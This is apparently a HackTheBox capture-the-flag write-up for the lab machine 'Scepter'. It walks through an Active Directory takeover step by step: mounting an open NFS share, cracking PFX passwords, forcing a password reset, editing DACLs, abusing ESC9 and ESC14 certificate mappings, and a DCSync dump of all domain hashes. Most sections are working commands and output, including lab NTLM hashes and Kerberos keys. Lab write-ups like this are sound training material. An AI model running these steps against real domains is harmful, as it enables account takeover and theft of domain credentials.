---
icon: crown
---

# HTB-SCEPTER

<figure><img src="../../../../.gitbook/assets/image (323).png" alt=""><figcaption></figcaption></figure>

***

#### **Attack Flow Explanation**

**1. Initial Access**

1. **NFS Enumeration** – The target had an NFS (Network File System) service running that was unsecured, meaning no authentication was required.
2. **Sensitive File Discovery** – Within the NFS share, a **PFX certificate and private key** were found, which were password protected.
3. **Password Cracking** – The password for the PFX file was cracked (using tools like `john` or `openssl`).
4. **User Access** – Using the cracked certificate, authentication was performed and initial foothold was gained as **d.baker**.

**2. Privilege Escalation**

5. **Force Password Change** – From `d.baker`, permissions were abused to force a password reset for **a.carter**.
6. **Modify ACL (GenericAll)** – Using `a.carter`’s privileges, the ACL for `d.baker` was modified to give **GenericAll** rights (full control).
7. **ESC9 via mail attribute** – The `mail` attribute was exploited (ESC9) to gain a shell as **h.brown**.
8. **Modify altSecurityIdentities & ESC14** – Using h.brown, the `altSecurityIdentities` attribute was modified and ESC14 was used to compromise **p.adams**.
9. **DCSync Attack** – From p.adams, a **DCSync** attack was performed to dump the entire AD domain and finally obtain an **Administrator** shell.<br>

Lets Begin !

### Reconnaissance <a href="#reconnaissance" id="reconnaissance"></a>

```python
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'

Discovered open port 53/tcp on 10.10.11.65
Discovered open port 111/tcp on 10.10.11.65
Discovered open port 135/tcp on 10.10.11.65
Discovered open port 49671/tcp on 10.10.11.65
Discovered open port 88/tcp on 10.10.11.65
Discovered open port 49686/tcp on 10.10.11.65
Discovered open port 5985/tcp on 10.10.11.65
Discovered open port 139/tcp on 10.10.11.65
Discovered open port 49667/tcp on 10.10.11.65
Discovered open port 49664/tcp on 10.10.11.65
Discovered open port 464/tcp on 10.10.11.65
Discovered open port 389/tcp on 10.10.11.65
Discovered open port 49688/tcp on 10.10.11.65
Discovered open port 3269/tcp on 10.10.11.65
Discovered open port 5986/tcp on 10.10.11.65
Discovered open port 49687/tcp on 10.10.11.65
Discovered open port 49665/tcp on 10.10.11.65
Discovered open port 3268/tcp on 10.10.11.65
Discovered open port 49760/tcp on 10.10.11.65
Discovered open port 49666/tcp on 10.10.11.65
Discovered open port 49689/tcp on 10.10.11.65

PORT      STATE SERVICE      REASON          VERSION
53/tcp    open  domain       syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-05-13 16:17:40Z)
111/tcp   open  rpcbind      syn-ack ttl 127 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status

135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scepter.htb0., Site: Default-First-Site-Name)

464/tcp   open  kpasswd5?    syn-ack ttl 127
3268/tcp  open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scepter.htb0., Site: Default-First-Site-Name)

3269/tcp  open  ssl/ldap     syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scepter.htb0., Site: Default-First-Site-Name)

5985/tcp  open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
5986/tcp  open  ssl/http     syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

49664/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49671/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49686/tcp open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49687/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49688/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49689/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49760/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

```

#### found : `dc01.scepter.htb` / `scepter.htb`

#### lets add this to `/etc/hosts` file:

```python
(sn0x㉿sn0x)-[~/hackthebox/scepter]
└─$ echo "10.10.11.65 dc01.scepter.htb scepter.htb" | sudo tee -a /etc/hosts > /dev/null
```

Glancing over the open ports, this is the **Domain Controller** `DC01` for the `scepter.htb` domain. Therefore I add the domain, hostname and FQDN to my `/etc/hosts` file. I rather unusual port `2049` was detected and this is associated with the **Network File System**.



### Initial Access <a href="#initial-access" id="initial-access"></a>

Since the **NFS** stood out on the **nmap** scan I start with listing the exported shares with **showmount**.

```python
$ showmount --all dc01.scepter.htb
All mount points on dc01.scepter.htb:
10.10.10.40:/helpdesk
```

Only one share called `/helpdesk` is available and I proceed to mount the share on my system. Checking the contents reveal three **PFX** keystores as well as a certificate with presumably the corresponding key. Those keystores are commonly used to store a certificate and key, protected by a passphrase.

```python
(sn0x㉿sn0x)-[~/hackthebox/scepter]
└─$ showmount -e 10.10.11.65
Export list for 10.10.11.65:
/helpdesk (everyone)

(sn0x㉿sn0x)-[~/hackthebox/scepter]
└─$ mkdir /tmp/helpdesk-nfs
                                                                                                                              
┌──(sn0x㉿sn0x)-[~/hackthebox/scepter]
└─$ sudo mount -t nfs 10.10.11.65:/helpdesk /tmp/helpdesk-nfs

(sn0x㉿sn0x)-[~/hackthebox/scepter]
└─$ sudo ls -la /tmp/helpdesk-nfs        
[sudo] password for sn0x: 
total 21
drwx------  2 nobody nogroup   64 Nov  1  2024 .
drwxrwxrwt 15 root   root     360 May 13 04:34 ..
-rwx------  1 nobody nogroup 2484 Nov  1  2024 baker.crt
-rwx------  1 nobody nogroup 2029 Nov  1  2024 baker.key
-rwx------  1 nobody nogroup 3315 Nov  1  2024 clark.pfx
-rwx------  1 nobody nogroup 3315 Nov  1  2024 lewis.pfx
-rwx------  1 nobody nogroup 3315 Nov  1  2024 scott.pfx// Some code
```

After I extract the hash with **pfx2john** from all the keystores and pass them to **john** to crack, the tool reports the same password `newpassword` for all of them.

```python
sn0x㉿sn0x)-[~/hackthebox/scepter]
└─$ pfx2john crt/clark.pfx > hash
 
sn0x㉿sn0x)-[~/hackthebox/scepter]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt --fork=10 hash
clark.pfx:newpassword:::::clark.pfx// Some code
```

Then I remove the passphrase and try to authenticate with [certipy](https://github.com/ly4k/Certipy) but all of the credentials are revoked already.

```python
(sn0x㉿sn0x)-[~/hackthebox/scepter]
└─$ certipy-ad cert -pfx clark.pfx -password newpassword -export -out clark_nopw.pfx
Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
[*] Writing PFX to 'clark_nopw.pfx'
 
$ faketime -f +8h certipy-ad auth -pfx clark_nopw.pfx
Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
[*] Using principal: m.clark@scepter.htb
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)// Some code
```

The keystores seem to be dead end, therefore I’ll try my luck with the single certificate and its key. I combine them into a **PFX** and the password required to decrypt the key is also `newpassword`. I don’t set a new export password.

```python
(sn0x㉿sn0x)-[~/hackthebox/scepter]
└─$ openssl pkcs12 -export \
                 -out baker.pfx \
                 -inkey baker.key \
                 -in baker.crt
Enter pass phrase for baker.key: newpassword
Enter Export Password:
Verifying - Enter Export Password:

```

This time the authentication works and I get a TGT and the NTLM for `d.baker`.

```python
(sn0x㉿sn0x)-[~/hackthebox/scepter]
└─$ faketime -f +8h certipy-ad auth -pfx baker.pfx
Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
[*] Using principal: d.baker@scepter.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'd.baker.ccache'
[*] Trying to retrieve NT hash for 'd.baker'
[*] Got hash for 'd.baker@scepter.htb': aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce


```

### Privilege Escalation <a href="#privilege-escalation" id="privilege-escalation"></a>

Now with access to the domain I run [bloodhound-ce-python](https://github.com/dirkjanm/BloodHound.py/tree/bloodhound-ce) to collect the data for **BloodHound** in order to get an overview.

```python
(sn0x㉿sn0x)-[~/hackthebox/scepter]
└─$ bloodhound-ce-python -d scepter.htb \
                       -dc dc01.scepter.htb \
                       -u 'd.baker' \
                       --hashes :18b5fb0d99e7a475316213c15b6f22ce \
                       -c ALL \
                       --zip \
                       -ns 10.129.166.15
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: scepter.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.scepter.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.scepter.htb
INFO: Found 11 users
INFO: Found 57 groups
INFO: Found 2 gpos
INFO: Found 3 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc01.scepter.htb
INFO: Done in 00M 04S
INFO: Compressing output into 20250519173023_bloodhound.zip// Some code
```

After loading the **ZIP** into **BloodHound** I can spot an edge between `d.baker` and `a.carter` by resetting the password of the account.

Passing the hash via **bloodyAD** let’s me set the password for `a.carter` to `Helloworld123!`.

```python
(sn0x㉿sn0x)-[~/hackthebox/scepter]
└─$ bloodyAD --host dc01.scepter.htb \
           -d "scepter.htb" \
           -u d.baker \
           -p ':18b5fb0d99e7a475316213c15b6f22ce' \
           set password "a.carter" 'Helloworld123!'
[+] Password changed successfully!


```

#### Shell as h.brown <a href="#shell-as-hbrown" id="shell-as-hbrown"></a>

Checking back in **BloodHound** there’s also an edge cycling back to `d.baker`. For now there’s no point in exploiting this because I already compromised the account.

<figure><img src="../../../../.gitbook/assets/image (325).png" alt=""><figcaption></figcaption></figure>

The authentication via certificates obviously requires the **Active Directory Certificate Services** (ADCS) to be present and to check for common misconfigurations I run `certipy find`. With the `-vulnerable` switch the tool limits the output to certificate templates where such a configuration issue is found.

```python
sn0x㉿sn0x)-[~/hackthebox/scepter]
└─$ certipy-ad find -u d.baker@scepter.htb \
                  -hashes :18b5fb0d99e7a475316213c15b6f22ce \
                  -vulnerable \
                  -stdout \
                  -text
Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
[*] Finding certificate templates
[*] Found 35 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 13 enabled certificate templates
[*] Trying to get CA configuration for 'scepter-DC01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'scepter-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'scepter-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'scepter-DC01-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : scepter-DC01-CA
    DNS Name                            : dc01.scepter.htb
    Certificate Subject                 : CN=scepter-DC01-CA, DC=scepter, DC=htb
    Certificate Serial Number           : 716BFFE1BE1CD1A24010F3AD0E350340
    Certificate Validity Start          : 2024-10-31 22:24:19+00:00
    Certificate Validity End            : 2061-10-31 22:34:19+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : SCEPTER.HTB\Administrators
      Access Rights
        ManageCertificates              : SCEPTER.HTB\Administrators
                                          SCEPTER.HTB\Domain Admins
                                          SCEPTER.HTB\Enterprise Admins
        ManageCa                        : SCEPTER.HTB\Administrators
                                          SCEPTER.HTB\Domain Admins
                                          SCEPTER.HTB\Enterprise Admins
        Enroll                          : SCEPTER.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : StaffAccessCertificate
    Display Name                        : StaffAccessCertificate
    Certificate Authorities             : scepter-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireEmail
                                          SubjectRequireDnsAsCn
                                          SubjectAltRequireEmail
    Enrollment Flag                     : NoSecurityExtension
                                          AutoEnrollment
    Private Key Flag                    : 16842752
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 99 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SCEPTER.HTB\staff
      Object Control Permissions
        Owner                           : SCEPTER.HTB\Enterprise Admins
        Full Control Principals         : SCEPTER.HTB\Domain Admins
                                          SCEPTER.HTB\Local System
                                          SCEPTER.HTB\Enterprise Admins
        Write Owner Principals          : SCEPTER.HTB\Domain Admins
                                          SCEPTER.HTB\Local System
                                          SCEPTER.HTB\Enterprise Admins
        Write Dacl Principals           : SCEPTER.HTB\Domain Admins
                                          SCEPTER.HTB\Local System
                                          SCEPTER.HTB\Enterprise Admins
        Write Property Principals       : SCEPTER.HTB\Domain Admins
                                          SCEPTER.HTB\Local System
                                          SCEPTER.HTB\Enterprise Admins
    [!] Vulnerabilities
      ESC9                              : 'SCEPTER.HTB\\staff' can enroll and template has no security extension// Some code
```

One misconfiguration is found: `ESC9` means that the template `StaffAccessCertificate` has no security extension set and the strong certificate binding is not enforced<sup>1</sup>.

Querying the **Active Directory** for accounts that have _any_ value in `altSecurityIdentities` results in a single match for `h.brown`. That account has a mapping for an email set and if I control another account with the mail attribute set to `h.brown@scepter.htb`, I can impersonate that account. This is a **weak** mapping but can be exploited due to the missing extension.

```python
sn0x㉿sn0x)-[~/hackthebox/scepter]
└─$ nxc ldap dc01.scepter.htb -u d.baker \
                            -H 18b5fb0d99e7a475316213c15b6f22ce \
                            --query \
                            "(&(objectClass=user)(altSecurityIdentities=*))" \
                            "samaccountname altSecurityIdentities memberOf"
LDAP        10.129.94.40    389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:scepter.htb)
LDAP        10.129.94.40    389    DC01             [+] scepter.htb\d.baker:18b5fb0d99e7a475316213c15b6f22ce 
LDAP        10.129.94.40    389    DC01             [+] Response for object: CN=h.brown,CN=Users,DC=scepter,DC=htb
LDAP        10.129.94.40    389    DC01             memberOf             CN=CMS,CN=Users,DC=scepter,DC=htb
LDAP        10.129.94.40    389    DC01                                  CN=Helpdesk Admins,CN=Users,DC=scepter,DC=htb
LDAP        10.129.94.40    389    DC01                                  CN=Protected Users,CN=Users,DC=scepter,DC=htb
LDAP        10.129.94.40    389    DC01                                  CN=Remote Management Users,CN=Builtin,DC=scepter,DC=htb
LDAP        10.129.94.40    389    DC01             sAMAccountName       h.brown
LDAP        10.129.94.40    389    DC01             altSecurityIdentities X509:<RFC822>h.brown@scepter.htb
```

Now the path from `a.carter` back to `d.baker` can be used get `GenericAll` over the account, set the `mail` attribute to `h.brown@scepter.htb` and request a new certificate. The user `h.brown` is part of the `Remote Management Users` and can therefore get a shell on the target.

Through **dacledit** I add a new DACL that adds `FullControl` to the `STAFF ACCESS CERTIFICATE` organizational unit for the account `a.carter`. Specifying `-inheritance` makes sure the new ACL also applies to all objects within that OU. Then I can modify the **mail** attribute for the `d.baker` user.

```python
sn0x㉿sn0x)-[~/hackthebox/scepter]
└─$ faketime -f +8h impacket-dacledit -action 'write' 
                                    -rights 'FullControl' \
                                    -inheritance \
                                    -principal 'a.carter' \
                                    -target-dn 'OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB' \
                                    scepter.htb/a.carter:'Helloworld123!'@dc01.scepter.htb
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
[*] DACL backed up to dacledit-20250520-202607.bak
[*] DACL modified successfully!
 
$ bloodyAD --host dc01.scepter.htb \
           -d scepter.htb \
           -u a.carter \
           -p 'Helloworld123!' \
           set object d.baker mail -v h.brown@scepter.htb
[+] d.baker's mail has been updated
```

Now with the prerequisites in place I request a new certificate via **certipy** with the vulnerable template `StaffAccessCertificate`.

```python
sn0x㉿sn0x)-[~/hackthebox/scepter]
└─$ certipy-ad req -username 'd.baker@scepter.htb' \
                 -hashes :18b5fb0d99e7a475316213c15b6f22ce \
                 -target dc01.scepter.htb \
                 -ca scepter-DC01-CA \
                 -template StaffAccessCertificate
Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 3
[*] Got certificate without identification
[*] Certificate has no object SID
[*] Saved certificate and private key to 'd.baker.pfx'
```

During the authentication with the certificate I have to specify the domain and the user `h.brown` to make sure I get authenticated to the correct account. This creates a new TGT and also prints the **NTLM** hash for the user.

```python
sn0x㉿sn0x)-[~/hackthebox/scepter]
└─$ faketime -f +8h certipy-ad auth -pfx d.baker.pfx \
                                  -u h.brown \
                                  -domain scepter.htb
Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
[!] Could not find identification in the provided certificate
[*] Using principal: h.brown@scepter.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'h.brown.ccache'
[*] Trying to retrieve NT hash for 'h.brown'
[*] Got hash for 'h.brown@scepter.htb': aad3b435b51404eeaad3b435b51404ee:4ecf5242092c6fb8c360a08069c75a0c
```

After configuring the `krb5.conf` with this [script](https://gist.github.com/ryukisec/327c75b7549856922b87353757612339) I can login via **evil-winrm** and collect the first flag.

```python

sn0x㉿sn0x)-[~/hackthebox/scepter]
└─$ export KRB5CCNAME=h.brown.ccache
 
sn0x㉿sn0x)-[~/hackthebox/scepter]
└─$ evil-winrm -i dc01.scepter.htb -r scepter.htb

```

#### Shell as p.adams <a href="#shell-as-padams" id="shell-as-padams"></a>

At first glance there are no outbound connections visible in **BloodHound** but the user `h.brown` is part of two _new_ groups, `CMS` and `HELPDESK ADMINS`. In order to check if any of those groups appear in ACLs I upload [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1), calculate the SID for each group and then enumerate **all** ACL. This uncovers **write** privileges to the `Alt-Security-Identities` attribute for user `p.adams`, one of the attack scenarios for `ESC14`<sup>2</sup>

```python
PS > . .\PowerView.ps1
PS > $cms = ConvertTo-Sid "CMS"
PS > $helpdesk = ConvertTo-Sid "HELPDESK ADMINS"
PS > Get-DomainObjectACL -ResolveGUIDs -Identity * | ?{($_.SecurityIdentifier -eq $cms) -or ($_.SecurityIdentifier -eq $helpdesk)}
 
 
AceQualifier           : AccessAllowed
ObjectDN               : CN=p.adams,OU=Helpdesk Enrollment Certificate,DC=scepter,DC=htb
ActiveDirectoryRights  : WriteProperty
ObjectAceType          : Alt-Security-Identities
ObjectSID              : S-1-5-21-74879546-916818434-740295365-1109
InheritanceFlags       : ContainerInherit
BinaryLength           : 72
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent, InheritedObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-74879546-916818434-740295365-1601
AccessMask             : 32
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, Inherited
InheritedObjectAceType : User
OpaqueLength           : 0
 
AceQualifier           : AccessAllowed
ObjectDN               : CN=p.adams,OU=Helpdesk Enrollment Certificate,DC=scepter,DC=htb
ActiveDirectoryRights  : ReadProperty
ObjectAceType          : All
ObjectSID              : S-1-5-21-74879546-916818434-740295365-1109
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : InheritedObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-74879546-916818434-740295365-1601
AccessMask             : 16
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, Inherited
InheritedObjectAceType : User
OpaqueLength           : 0
 
--- SNIP ---
```

This allows me to perform the same exploitation as before but this time with one extra step. I start by setting `altSecurityIdentities` for account `p.adams` to `X509:<RFC822>p.adams@scepter.htb`.

```python
(sn0x㉿sn0x)-[~/hackthebox/scepter]
└─$ export KRB5CCNAME=h.brown.ccache ;  faketime -f +8h bloodyAD -d scepter.htb -k --host dc01.scepter.htb set object p.adams altSecurityIdentities -v 'X509:<RFC822>p.adams@scepter.htb'[+] p.adams's altSecurityIdentities has been updated
```

Then I replace the mail attribute for `d.baker` with `p.adams@scepter.htb`.

```python
(sn0x㉿sn0x)-[~/hackthebox/scepter]
└─$ bloodyAD --host dc01.scepter.htb \
           -d scepter.htb \
           -u a.carter \
           -p 'Helloworld123!' \
           set object d.baker mail -v p.adams@scepter.htb
[+] d.baker's mail has been updated
```

And finally I request another certificate for `d.baker` and use it to authenticate as `p.adams`. Once again I get the TGT and NTLM hash for the impersonated account.

```python
(sn0x㉿sn0x)-[~/hackthebox/scepter]
└─$ certipy-ad req -username 'd.baker@scepter.htb' \
                 -hashes :18b5fb0d99e7a475316213c15b6f22ce \
                 -target dc01.scepter.htb \
                 -ca scepter-DC01-CA \
                 -template StaffAccessCertificate
Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 5
[*] Got certificate without identification
[*] Certificate has no object SID
[*] Saved certificate and private key to 'd.baker.pfx'
 
(sn0x㉿sn0x)-[~/hackthebox/scepter]
└─$ faketime -f +8h certipy-ad auth -pfx d.baker.pfx \
                                  -u p.adams \
                                  -domain scepter.htb
Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
[!] Could not find identification in the provided certificate
[*] Using principal: p.adams@scepter.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'p.adams.ccache'
[*] Trying to retrieve NT hash for 'p.adams'
[*] Got hash for 'p.adams@scepter.htb': aad3b435b51404eeaad3b435b51404ee:1b925c524f447bb821a8789c4b118ce0
```

According to **BloodHound** `p.adams` can use `DCSync` to dump all the hashes from the domain.

<figure><img src="../../../../.gitbook/assets/image (326).png" alt=""><figcaption></figcaption></figure>

With the help of **secretsdump** I retrieve all hashes of the domain `scepter.htb` and use the NTLM hash of `Administrator` to get an interactive shell on the **Domain Controller**.

```python
(sn0x㉿sn0x)-[~/hackthebox/scepter]
└─$ impacket-secretsdump -hashes :1b925c524f447bb821a8789c4b118ce0 scepter.htb/p.adams@dc01.scepter.htb
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a291ead3493f9773dc615e66c2ea21c4:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:c030fca580038cc8b1100ee37064a4a9:::
scepter.htb\d.baker:1106:aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce:::
scepter.htb\a.carter:1107:aad3b435b51404eeaad3b435b51404ee:c068bcc3c0dcd03cd84df5af2192ad8a:::
scepter.htb\h.brown:1108:aad3b435b51404eeaad3b435b51404ee:4ecf5242092c6fb8c360a08069c75a0c:::
scepter.htb\p.adams:1109:aad3b435b51404eeaad3b435b51404ee:1b925c524f447bb821a8789c4b118ce0:::
scepter.htb\e.lewis:2101:aad3b435b51404eeaad3b435b51404ee:628bf1914e9efe3ef3a7a6e7136f60f3:::
scepter.htb\o.scott:2102:aad3b435b51404eeaad3b435b51404ee:3a4a844d2175c90f7a48e77fa92fce04:::
scepter.htb\M.clark:2103:aad3b435b51404eeaad3b435b51404ee:8db1c7370a5e33541985b508ffa24ce5:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:0a4643c21fd6a17229b18ba639ccfd5f:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:cc5d676d45f8287aef2f1abcd65213d9575c86c54c9b1977935983e28348bcd5
Administrator:aes128-cts-hmac-sha1-96:bb557b22bad08c219ce7425f2fe0b70c
Administrator:des-cbc-md5:f79d45bf688aa238
krbtgt:aes256-cts-hmac-sha1-96:5d62c1b68af2bb009bb4875327edd5e4065ef2bf08e38c4ea0e609406d6279ee
krbtgt:aes128-cts-hmac-sha1-96:b9bc4dc299fe99a4e086bbf2110ad676
krbtgt:des-cbc-md5:57f8ef4f4c7f6245
scepter.htb\d.baker:aes256-cts-hmac-sha1-96:6adbc9de0cb3fb631434e513b1b282970fdc3ca089181991fb7036a05c6212fb
scepter.htb\d.baker:aes128-cts-hmac-sha1-96:eb3e28d1b99120b4f642419c99a7ac19
scepter.htb\d.baker:des-cbc-md5:2fce8a3426c8c2c1
scepter.htb\a.carter:aes256-cts-hmac-sha1-96:0ee0e517f664a3769695b552c41c8774177bce0ea64d40790d288ab48c25445e
scepter.htb\a.carter:aes128-cts-hmac-sha1-96:c2d993de321808aa809380b1f61e3d78
scepter.htb\a.carter:des-cbc-md5:026475c7b567cb5b
scepter.htb\h.brown:aes256-cts-hmac-sha1-96:5779e2a207a7c94d20be1a105bed84e3b691a5f2890a7775d8f036741dadbc02
scepter.htb\h.brown:aes128-cts-hmac-sha1-96:1345228e68dce06f6109d4d64409007d
scepter.htb\h.brown:des-cbc-md5:6e6dd30151cb58c7
scepter.htb\p.adams:aes256-cts-hmac-sha1-96:0fa360ee62cb0e7ba851fce9fd982382c049ba3b6224cceb2abd2628c310c22f
scepter.htb\p.adams:aes128-cts-hmac-sha1-96:85462bdef70af52770b2260963e7b39f
scepter.htb\p.adams:des-cbc-md5:f7a26e794949fd61
scepter.htb\e.lewis:aes256-cts-hmac-sha1-96:1cfd55c20eadbaf4b8183c302a55c459a2235b88540ccd75419d430e049a4a2b
scepter.htb\e.lewis:aes128-cts-hmac-sha1-96:a8641db596e1d26b6a6943fc7a9e4bea
scepter.htb\e.lewis:des-cbc-md5:57e9291aad91fe7f
scepter.htb\o.scott:aes256-cts-hmac-sha1-96:4fe8037a8176334ebce849d546e826a1248c01e9da42bcbd13031b28ddf26f25
scepter.htb\o.scott:aes128-cts-hmac-sha1-96:37f1bd1cb49c4923da5fc82b347a25eb
scepter.htb\o.scott:des-cbc-md5:e329e37fda6e0df7
scepter.htb\M.clark:aes256-cts-hmac-sha1-96:a0890aa7efc9a1a14f67158292a18ff4ca139d674065e0e4417c90e5a878ebe0
scepter.htb\M.clark:aes128-cts-hmac-sha1-96:84993bbad33c139287239015be840598
scepter.htb\M.clark:des-cbc-md5:4c7f5dfbdcadba94
DC01$:aes256-cts-hmac-sha1-96:4da645efa2717daf52672afe81afb3dc8952aad72fc96de3a9feff0d6cce71e1
DC01$:aes128-cts-hmac-sha1-96:a9f8923d526f6437f5ed343efab8f77a
DC01$:des-cbc-md5:d6923e61a83d51ef
[*] Cleaning up...
```

<figure><img src="../../../../.gitbook/assets/complete (20).gif" alt=""><figcaption></figcaption></figure>
